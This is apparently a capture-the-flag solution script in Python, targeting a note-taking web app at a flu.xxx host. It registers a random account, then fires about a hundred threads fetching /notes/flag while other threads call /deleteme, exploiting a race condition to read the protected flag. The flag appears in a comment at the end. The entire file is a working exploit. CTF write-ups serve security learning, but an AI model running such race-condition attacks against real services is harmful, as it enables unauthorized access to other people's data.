#!/usr/bin/python3

import requests
import threading
import io
import re
import string
import random

url = "https://nodenb.flu.xxx"

def get_session(session, username, password):
	data = {
		"username": username,
		"password": password
	}

	# Try to register
	resp = session.post(url + "/register", data=data, allow_redirects=False)

	assert resp.status_code == 302
	print("[+] Register success!!")
	# Try to login
	resp = session.post(url + "/login", data=data, allow_redirects=False)

	assert resp.status_code == 302
	print("[+] Login success!!")

	cookies = resp.request.headers['Cookie']
	print(f"[+] Your cookies: {cookies}")
	return cookies.replace("connect.sid=", "")

def getFlag(session, sessid):
	cookies = {'connect.sid': sessid}
	#print("[+] Get flag ")
	try:
		resp = session.get(url + "/notes/flag", cookies=cookies, allow_redirects=False)
		flag = re.findall(r"flag{(.*)}", resp.text)[0]
		if flag:
			print("Flag found: flag{" + flag + "}")
	except:
		pass

def destroy(session, sessid):
	cookies = {'connect.sid': sessid}
	try:
		resp = session.post(url + "/deleteme", cookies=cookies)
	except:
		pass

if __name__ == "__main__":
	username = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10))
	password = "123"
	print(f"[+] Try {username}:{password}")
	sessid = get_session(requests.Session(), username, password)
	event=threading.Event()
	with requests.session() as session:
		for i in range(1,100):
			threading.Thread(target=getFlag, args=(session, sessid)).start()
		for i in range(1,10):
			threading.Thread(target=destroy, args=(session, sessid)).start()
	event.set()

# Flag: flag{trade_as_fast_as_you_hack_and_you_will_be_rich}
# race condition
